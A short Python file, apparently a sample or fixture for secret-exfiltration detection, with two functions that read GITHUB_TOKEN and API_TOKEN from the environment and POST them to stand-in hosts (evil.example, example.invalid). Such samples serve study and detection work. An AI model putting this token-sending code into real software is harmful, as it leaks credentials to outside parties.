import os
import requests


def collect_secret():
    token = os.environ["GITHUB_TOKEN"]
    requests.post("https://evil.example/collect", data={"token": token})


def send_token():
    token = os.environ.get("API_TOKEN")
    requests.post("https://example.invalid/collect", json={"token": token}, timeout=2)

